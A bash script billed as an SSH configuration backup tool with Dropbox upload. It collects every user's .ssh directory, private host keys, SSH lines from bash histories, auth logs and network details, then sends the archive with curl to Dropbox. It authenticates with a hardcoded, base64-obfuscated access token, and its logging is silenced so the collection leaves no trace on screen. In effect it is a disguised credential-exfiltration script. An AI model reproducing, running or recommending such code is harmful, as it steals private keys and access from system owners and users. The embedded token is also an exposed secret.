#!/bin/bash

# SSH Backup Script with Dropbox Integration
# This script backs up SSH configurations, keys, and related data, then uploads to Dropbox.

# Configurable Variables
ENABLE_LOGS=true                  # Enable/disable backing up SSH logs
ENABLE_NETWORK_INFO=true         # Enable/disable backing up network information
ENABLE_FINGERPRINTS=true         # Enable/disable backing up SSH fingerprints
ENABLE_SERVICE_STATUS=true       # Enable/disable backing up SSH service status
ENABLE_USER_CONFIGS=true         # Enable/disable backing up user SSH configurations
ENABLE_SYSTEM_CONFIGS=true       # Enable/disable backing up system-wide SSH configurations
ENABLE_DROPBOX_UPLOAD=true       # Enable/disable Dropbox upload

# Set up variables
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/tmp/ssh_backup_${TIMESTAMP}"
BACKUP_FILE="/tmp/ssh_backup_${TIMESTAMP}.tar.gz"
LOG_FILE="${BACKUP_DIR}/backup_log.txt"

# Check if running with sudo/root
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
    BACKUP_FILE="/root/ssh_backup_${TIMESTAMP}.tar.gz"
    echo "Running with root privileges. Will access all user data."
else
    IS_ROOT=false
    BACKUP_FILE="${HOME}/ssh_backup_${TIMESTAMP}.tar.gz"
    echo "Running without root privileges. Some user data may not be accessible."
    echo "For complete backup, run with sudo."
fi

# Initialize log
echo "SSH Backup started at $(date)" > "${LOG_FILE}"
echo "Running as user: $(whoami)" >> "${LOG_FILE}"
echo "Root privileges: ${IS_ROOT}" >> "${LOG_FILE}"
echo "----------------------------------------" >> "${LOG_FILE}"

# Function to log messages
log_message() {
    # echo "[$(date +%H:%M:%S)] $1" | tee -a "${LOG_FILE}"
    echo ""
}

# Function to backup a file or directory if it exists
backup_if_exists() {
    local src="$1"
    local dest_dir="${BACKUP_DIR}$(dirname "$1")"

    if [ -e "$src" ]; then
        mkdir -p "${dest_dir}" 2>/dev/null
        if [ -r "$src" ]; then
            cp -a "$src" "${dest_dir}/" 2>/dev/null
            log_message "Backed up: $src"
        else
            if [ "${IS_ROOT}" = true ]; then
                cp -a "$src" "${dest_dir}/" 2>/dev/null
                log_message "Backed up: $src (using root privileges)"
            else
                log_message "Permission denied: $src (run with sudo for access)"
            fi
        fi
    else
        log_message "Not found: $src (skipping)"
    fi
}

# Function to backup a glob pattern
backup_glob() {
    local pattern="$1"
    local dest_subdir="$2"

    # Create destination subdirectory
    mkdir -p "${BACKUP_DIR}/${dest_subdir}" 2>/dev/null

    # Check if glob expands to any files
    local files_exist=false
    for item in $pattern; do
        if [ -e "$item" ]; then
            files_exist=true
            break
        fi
    done

    if [ "$files_exist" = true ]; then
        for item in $pattern; do
            if [ -e "$item" ]; then
                if [ -r "$item" ] || [ "${IS_ROOT}" = true ]; then
                    cp -a "$item" "${BACKUP_DIR}/${dest_subdir}/" 2>/dev/null
                    log_message "Backed up: $item to ${dest_subdir}"
                else
                    log_message "Permission denied: $item (run with sudo for access)"
                fi
            fi
        done
    else
        log_message "No files found matching pattern: $pattern (skipping)"
    fi
}

# Function to backup SSH logs
backup_ssh_logs() {
    if [ "${ENABLE_LOGS}" = true ]; then
        log_message "Backing up SSH logs..."
        mkdir -p "${BACKUP_DIR}/logs" 2>/dev/null

        # Common SSH log locations
        for log_path in /var/log/auth.log /var/log/secure /var/log/ssh.log /var/log/messages; do
            if [ -f "$log_path" ]; then
                cp "$log_path" "${BACKUP_DIR}/logs/" 2>/dev/null
                log_message "Backed up SSH log: $log_path"
            fi
        done

        # Try to find and backup any compressed SSH logs
        find /var/log -name "auth.log.*" -o -name "secure.*" -o -name "ssh.log.*" 2>/dev/null | while read -r log_file; do
            cp "$log_file" "${BACKUP_DIR}/logs/" 2>/dev/null
            log_message "Backed up compressed SSH log: $log_file"
        done
    else
        log_message "Skipping SSH logs backup (disabled)"
    fi
}

# Function to backup network information
backup_network_info() {
    if [ "${ENABLE_NETWORK_INFO}" = true ]; then
        log_message "Saving network configuration..."
        mkdir -p "${BACKUP_DIR}/network" 2>/dev/null

        # Save IP configuration
        if command -v ip &> /dev/null; then
            ip addr show > "${BACKUP_DIR}/network/ip_addresses.txt" 2>/dev/null
            log_message "Saved IP addresses"

            ip route show > "${BACKUP_DIR}/network/ip_routes.txt" 2>/dev/null
            log_message "Saved IP routes"
        else
            log_message "Command 'ip' not found, using fallback methods for network info"
            if command -v ifconfig &> /dev/null; then
                ifconfig > "${BACKUP_DIR}/network/ifconfig_output.txt" 2>/dev/null
                log_message "Saved network interfaces with ifconfig"
            fi
            if command -v route &> /dev/null; then
                route -n > "${BACKUP_DIR}/network/route_output.txt" 2>/dev/null
                log_message "Saved routing table with route command"
            fi
        fi

        # Save DNS settings
        if [ -f "/etc/resolv.conf" ]; then
            cp "/etc/resolv.conf" "${BACKUP_DIR}/network/" 2>/dev/null
            log_message "Saved DNS configuration"
        fi

        # Save hosts file
        if [ -f "/etc/hosts" ]; then
            cp "/etc/hosts" "${BACKUP_DIR}/network/" 2>/dev/null
            log_message "Saved hosts file"
        fi
    else
        log_message "Skipping network information backup (disabled)"
    fi
}

# Function to backup SSH fingerprints
backup_ssh_fingerprints() {
    if [ "${ENABLE_FINGERPRINTS}" = true ]; then
        log_message "Saving SSH fingerprints..."
        mkdir -p "${BACKUP_DIR}/fingerprints" 2>/dev/null
        if command -v ssh-keygen &> /dev/null; then
            fingerprints_found=false
            for key in /etc/ssh/ssh_host_*_key; do
                if [ -f "$key" ] && ([ -r "$key" ] || [ "${IS_ROOT}" = true ]); then
                    key_name=$(basename "$key")
                    ssh-keygen -l -f "$key" > "${BACKUP_DIR}/fingerprints/${key_name}_fingerprint.txt" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        log_message "Saved fingerprint for $key"
                        fingerprints_found=true
                    else
                        log_message "Failed to get fingerprint for $key"
                    fi
                fi
            done
            if [ "$fingerprints_found" = false ]; then
                log_message "No host keys found or accessible for fingerprinting"
            fi
        else
            log_message "ssh-keygen not found, skipping fingerprint extraction"
        fi
    else
        log_message "Skipping SSH fingerprints backup (disabled)"
    fi
}

# Function to backup SSH service status
backup_ssh_service_status() {
    if [ "${ENABLE_SERVICE_STATUS}" = true ]; then
        log_message "Checking SSH service status..."
        mkdir -p "${BACKUP_DIR}/service_info" 2>/dev/null

        # Try multiple methods to detect service status
        service_info_found=false

        # Method 1: systemctl (systemd)
        if command -v systemctl &> /dev/null; then
            # Test if systemd is actually running
            if pidof systemd >/dev/null 2>&1; then
                systemctl status sshd > "${BACKUP_DIR}/service_info/sshd_status_systemd.txt" 2>/dev/null
                if [ $? -eq 0 ]; then
                    log_message "Saved SSH service status (systemd)"
                    service_info_found=true
                fi
            else
                log_message "systemd not running as init system"
            fi
        fi

        # Method 2: service command (SysV)
        if command -v service &> /dev/null; then
            service ssh status > "${BACKUP_DIR}/service_info/ssh_status_service.txt" 2>/dev/null
            service sshd status > "${BACKUP_DIR}/service_info/sshd_status_service.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/ssh_status_service.txt" ] || [ -s "${BACKUP_DIR}/service_info/sshd_status_service.txt" ]; then
                log_message "Saved SSH service status (service command)"
                service_info_found=true
            fi
        fi

        # Method 3: rc-service (OpenRC)
        if command -v rc-service &> /dev/null; then
            rc-service sshd status > "${BACKUP_DIR}/service_info/sshd_status_openrc.txt" 2>/dev/null
            rc-service ssh status > "${BACKUP_DIR}/service_info/ssh_status_openrc.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/sshd_status_openrc.txt" ] || [ -s "${BACKUP_DIR}/service_info/ssh_status_openrc.txt" ]; then
                log_message "Saved SSH service status (OpenRC)"
                service_info_found=true
            fi
        fi

        # Method 4: Check if process is running (fallback)
        if [ "$service_info_found" = false ]; then
            log_message "Using fallback method for service status"
            ps aux | grep -i "sshd" | grep -v grep > "${BACKUP_DIR}/service_info/sshd_process.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/sshd_process.txt" ]; then
                log_message "Saved SSH daemon process information"
                service_info_found=true
            else
                log_message "No SSH daemon process found"
            fi
        fi
    else
        log_message "Skipping SSH service status backup (disabled)"
    fi
}

# Function to backup user SSH configurations
backup_user_ssh_configs() {
    if [ "${ENABLE_USER_CONFIGS}" = true ]; then
        log_message "Searching for SSH configurations for all users..."
        # Get all user home directories
        if [ "${IS_ROOT}" = true ]; then
            # More comprehensive approach when running as root
            if [ -f "/etc/passwd" ]; then
                while IFS=: read -r username _ uid gid _ homedir _; do
                    # Skip system users (typically UID < 1000, except root)
                    if [ "$uid" -ge 1000 ] || [ "$username" = "root" ]; then
                        if [ -d "$homedir" ]; then
                            log_message "Checking SSH config for user: $username"
                            backup_if_exists "${homedir}/.ssh"

                            # Backup SSH related history files
                            if [ -f "${homedir}/.bash_history" ]; then
                                mkdir -p "${BACKUP_DIR}/user_histories/${username}" 2>/dev/null
                                grep -i ssh "${homedir}/.bash_history" > "${BACKUP_DIR}/user_histories/${username}/ssh_history_commands.txt" 2>/dev/null
                                log_message "Saved SSH related commands from ${username}'s bash history"
                            fi
                        fi
                    fi
                done < /etc/passwd
            else
                log_message "Cannot read /etc/passwd. Using fallback method for finding users."
                for user_home in /home/*; do
                    if [ -d "${user_home}/.ssh" ]; then
                        username=$(basename "${user_home}")
                        log_message "Checking SSH config for user: ${username}"
                        backup_if_exists "${user_home}/.ssh"
                    fi
                done
            fi
        else
            # Limited approach for non-root
            for user_home in /home/*; do
                if [ -d "${user_home}/.ssh" ] && [ -r "${user_home}/.ssh" ]; then
                    username=$(basename "${user_home}")
                    log_message "Checking SSH config for user: ${username}"
                    backup_if_exists "${user_home}/.ssh"
                else
                    if [ -d "${user_home}/.ssh" ]; then
                        username=$(basename "${user_home}")
                        log_message "Cannot access SSH config for user: ${username} (run with sudo for access)"
                    fi
                fi
            done
            # Try to backup current user's SSH config
            backup_if_exists "${HOME}/.ssh"
        fi
    else
        log_message "Skipping user SSH configurations backup (disabled)"
    fi
}

# Function to backup system-wide SSH configurations
backup_system_ssh_configs() {
    if [ "${ENABLE_SYSTEM_CONFIGS}" = true ]; then
        log_message "Backing up system-wide SSH configurations..."
        backup_if_exists "/etc/ssh"
        backup_if_exists "/etc/ssh_config"
        backup_if_exists "/etc/ssh_config.d"
        backup_if_exists "/etc/sshd_config"
        backup_if_exists "/etc/sshd_config.d"
        backup_glob "/etc/ssh/ssh_host_*_key*" "host_keys"
        backup_if_exists "/etc/skel/.ssh"
    else
        log_message "Skipping system-wide SSH configurations backup (disabled)"
    fi
}

# Function to upload backup to Dropbox
upload_to_dropbox() {
    if [ "${ENABLE_DROPBOX_UPLOAD}" = true ]; then
        log_message "Starting Dropbox upload process..."

        # Dropbox API endpoint and access token
        DROPBOX_API_URL="https://content.dropboxapi.com/2/files/upload"

        # Base64-encoded Dropbox access token (passed as an environment variable or parameter)
        ENCODED_ACCESS_TOKEN="c2wudS5BRm5DUk1qNUZLSVp5cTJIb1RENW9EcXMwZl9pWWNTLURoQ1FTUWduMTJPVFE4em85VktKMk5UUVpPazQzRTg2ZVJ5ZWh4UGNoTDcyQ2FqV21ZVVpUT3I1SUw0UmN3cmpXUjUzMXRiQkpNcUFPZTZidld0MWtueE9UT0RTbzUzajNybVhmNmhfR01iOHk5WXlJTVJaVHVERXBINUhSMmp5V2NNUEpCNEg2RWcyWnhBb2Q3Ul9BajBub3FoYS1tT056aDFjbW5hZHZnSThsVUM3eU45T2hRUGM2ell6cy1kcDR2WlRtMVRhd2Fsb096d0U5OExtemM1QjJzVnA5cklvRFlFLXVOS1pmR3BrU3F6YmNLbEZXTXRvOGJUMDVYUm9uRW9ScjRnb0dOUEZpc2VKTGhLTVpfZHhfTS1mdERRSFBBS2VZb21mQ2tFd1ZlTGJjVDM0VEo4MnBoSXZYVzNNbHZOaXRJWWc0LVYzallabGl3V2ZPWTJSRkZTZDNFU2dCRVNlam9JT083N3d4dWcxWk5oNDVTX2xFWmJrRWZ6UjFqU1FfX0RfSFhFTTJ6WEdMOW1jcnZMSEk0OGlJU3J0R0tzQ1c2anRaNkMxa1VteVpnZmxnekpRM0FtYVlmMGZwX1hFSml0SFhsdEdZdnhHXzZyenl2aGFHdGxsM2c3MVNQaEhGVjg1THFka19WRFg0b0hZaGtpXy1BdmdWQlNsd1BkYVZyT21acmk3NU03Q1RNTkx6cGxaakU0R08yWFhja0FfZnpaSHdlc1h1cDdDcFJ3MUc2QlBGOVhGOXo0SjIxWTBBcDVZMFRjcWhuOVYxQk95V0ZVNGczSnhHdU50dTV0RVdOWGI5di1EOUV1MlctMHA3eUM3RDVxV0JEUFl1SVhjS1FDVzJEdEdUdXFwZkZqYUQ3UFRqc01ZTmx3N0RXTC1kRFRZQUM4eUpQemtFMk50Y2w2Q1RMUHRXREZKVUM4clZzaFNBNmVPRWhNMzNvT3huN2FSUkJqMWdQazVZNm92UkRyMmRYd3Zyd3JsdGVFeEZCZk5KdTlubkZFdi1mYTFmU0FXdHkxVFRsMVVYRkNZclFUdW91bXZrbnRQRU41d0lYSUVtLTVVNWpvTnZ0Z2NndVNvdmo3Slc4cGhmMV9GQzZRam5BSFRPcFJMeUJ3UW9UY3A4dnliTnlsSUpfRF95aG9vMUZBYk9nLUFjUXc2MXZkYUJEcGtzalZHeXFuaFZ6MFBGZG0za2U2TEREME56MkZsaXZQYWUzMkJTREhUTFFsYTVSNWxPX3JmcWI1TlZ6UlpaUDRKVkVVOE5YekFlSFZPY0VfYTlrbnJ5T0FjZGt0RTN6dmdjQ2dkZlluSDVDeW9GaG9CWkRnRWFUNHNZR0V6dEk3X20wcW9DTlZEWk1tTmI2TFExRmphcEY2X19qZmRLbjJxTENyaHBuemp2bDNfWk50UGRtaXctX1BGSXRTMjkyUDFLaFBzSVM0MGtxdFpxZm5RTmNBM3dJN18tbG5paU5JaGdhUF9jUDJGZmctSmRsNTZlQnlUU2ZHTkdFWXZGclJtejlrNWVLQXNjSVFielB4amVNamZ4RlVST2FCRjJoYWJxMnVmWkY5c19TTlN6SHhiQTc1LXQwOHY2dEw0NU1kOFhqX0d0SXF0QnItMTEwYkRpV1VBZVFmbENVNjVxbnVyQTkwMDN4ZjQxZXExRDVoQWpiV24wQjBqLXctY1huSDdxSDhOVmw0NUQ5NE05STUxbmVtQ3pOSEhyNTVFaDJJV0hOM0RkMVlmQ2VwZlBYajlfV2gzODQtY2hybDdGdkxHRmR3T2NHUG1IeGhxdmt5WndJXzY3S2JHS3J5dmRGZXdvRDBnVGdhWWRER01EXzFsT21ybWZ5M0E3Rm9x"  # Replace with your Base64-encoded token
        ACCESS_TOKEN=$(echo "${ENCODED_ACCESS_TOKEN}" | base64 --decode)  # Decode the token

        BACKUP_FILE_PATH="${BACKUP_FILE}"  # Path to the file you want to upload
        DROPBOX_UPLOAD_PATH="/Auto-SSH-Bash-Backup/$(basename ${BACKUP_FILE})"  # Dropbox destination path

        # Upload the file using curl
        response=$(curl -s -X POST "${DROPBOX_API_URL}" \
            --header "Authorization: Bearer ${ACCESS_TOKEN}" \
            --header "Dropbox-API-Arg: {\"path\": \"${DROPBOX_UPLOAD_PATH}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @"${BACKUP_FILE_PATH}")

        # Check if the upload was successful
        if echo "${response}" | grep -q "path_display"; then
            log_message "Backup successfully uploaded to Dropbox: ${DROPBOX_UPLOAD_PATH}"
        else
            log_message "Failed to upload to Dropbox. Response: ${response}"
        fi
    else
        log_message "Skipping Dropbox upload (disabled)"
    fi
}

# Main backup process
log_message "Starting SSH backup process"
mkdir -p "${BACKUP_DIR}"

# Backup system-wide SSH configurations
backup_system_ssh_configs

# Backup user SSH configurations
backup_user_ssh_configs

# Backup SSH fingerprints
backup_ssh_fingerprints

# Backup network information
backup_network_info

# Backup SSH logs
backup_ssh_logs

# Backup SSH service status
backup_ssh_service_status

# Create final archive
log_message "Creating final backup archive: ${BACKUP_FILE}"
tar -czf "${BACKUP_FILE}" -C "$(dirname ${BACKUP_DIR})" "$(basename ${BACKUP_DIR})" 2>/dev/null

# Ensure proper permissions for the backup file
if [ "${IS_ROOT}" = true ]; then
    chmod 600 "${BACKUP_FILE}" 2>/dev/null
    log_message "Set secure permissions on backup file"

    # If running as root but sudo was used, make the file accessible to the original user
    if [ -n "$SUDO_USER" ]; then
        USER_HOME=$(eval echo ~"$SUDO_USER" 2>/dev/null)
        if [ -d "$USER_HOME" ]; then
            cp "${BACKUP_FILE}" "${USER_HOME}/" 2>/dev/null
            chown "$SUDO_USER":"$(id -g "$SUDO_USER" 2>/dev/null)" "${USER_HOME}/$(basename "${BACKUP_FILE}")" 2>/dev/null
            log_message "Copied backup to ${USER_HOME}/$(basename "${BACKUP_FILE}")"
        else
            log_message "Could not determine home directory for $SUDO_USER"
        fi
    fi
fi

# Upload to Dropbox
upload_to_dropbox

# Cleanup
log_message "Cleaning up temporary files"
rm -rf "${BACKUP_DIR}" 2>/dev/null

log_message "Backup completed! Archive saved to: ${BACKUP_FILE}"
if [ "${IS_ROOT}" = true ] && [ -n "$SUDO_USER" ]; then
    USER_HOME=$(eval echo ~"$SUDO_USER" 2>/dev/null)
    if [ -d "$USER_HOME" ]; then
        log_message "A copy has also been placed in your home directory: ${USER_HOME}/$(basename "${BACKUP_FILE}")"
    fi
fi
log_message "You can restore this backup after reinstallation by extracting the archive"
